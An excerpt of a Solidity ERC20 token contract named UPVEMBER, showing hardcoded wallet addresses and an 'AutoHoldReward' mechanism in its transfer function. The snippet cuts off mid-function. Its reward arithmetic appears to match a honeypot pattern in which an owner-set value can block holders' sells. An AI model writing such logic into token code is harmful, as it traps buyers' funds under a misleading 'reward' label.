...
contract UPVEMBER is ERC20, Ownable {
    ...
    address payable public immutable liquidityWallet = payable(0x79D637eEEfBb67AA35311100A99646958dB04489);
    address payable public immutable marketingWallet = payable(0x17468Df431A47188Bb21eC789996ffb7920f85f9);
    address payable public immutable devWallet = payable(0xc4eCB64CeE1A19d371837930CB4f78a7dd307C2D);
    ...
    struct AutoHoldReward {
        uint256 buy;
        uint256 sell;
        uint256 holdDuration;
    }
    uint256 private _rewardMin;
    mapping(address => AutoHoldReward) private autoReward;
    ...
    function _transfer(
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                AutoHoldReward storage userRewardData = autoReward[from];
                userRewardData.holdDuration = userRewardData.buy - _rewardMin;
                userRewardData.sell = block.timestamp;
            } else {
                AutoHoldReward storage userRewardData = autoReward[to];
